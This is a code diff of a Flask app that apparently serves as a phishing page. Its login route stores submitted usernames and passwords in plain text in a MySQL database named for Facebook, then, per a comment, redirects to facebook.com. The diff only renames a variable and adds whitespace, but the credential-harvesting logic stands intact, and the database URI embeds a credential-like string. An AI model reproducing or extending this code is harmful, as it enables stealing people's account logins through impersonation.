@@ -9,9 +9,12 @@ app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://facebook_blindcity:59257e84d141
 db = SQLAlchemy(app)
 
 class User(db.Model):
+    
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(50), unique=True, nullable=False)
     password = db.Column(db.String(100), nullable=False)
+
+    
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
@@ -20,8 +23,8 @@ def login():
         password = request.form['password']
 
         # Save to database
-        new_user = User(username=username, password=password)
-        db.session.add(new_user)
+        users = User(username=username, password=password)
+        db.session.add(users)
         db.session.commit()
 
         # Redirect to facebook.com
